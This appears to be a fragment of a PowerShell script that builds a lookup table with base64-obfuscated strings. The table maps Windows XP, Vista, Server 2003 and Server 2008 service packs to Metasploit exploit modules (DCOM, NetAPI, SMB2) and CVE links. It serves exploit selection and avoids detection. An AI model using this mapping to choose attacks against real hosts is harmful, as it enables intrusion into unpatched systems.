    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADQAXwAwADEAMQBfAGwAcwBhAHMAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAANQAzADMALwA='))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADQAXwAwADEAMQBfAGwAcwBhAHMAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAANQAzADMALwA='))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADUAXwAwADMAOQBfAHAAbgBwAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADEAOQA4ADMA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADYANgBfAG4AdwBhAHAAaQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA4ADgA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADcAMABfAHcAawBzAHMAdgBjAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA5ADEA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
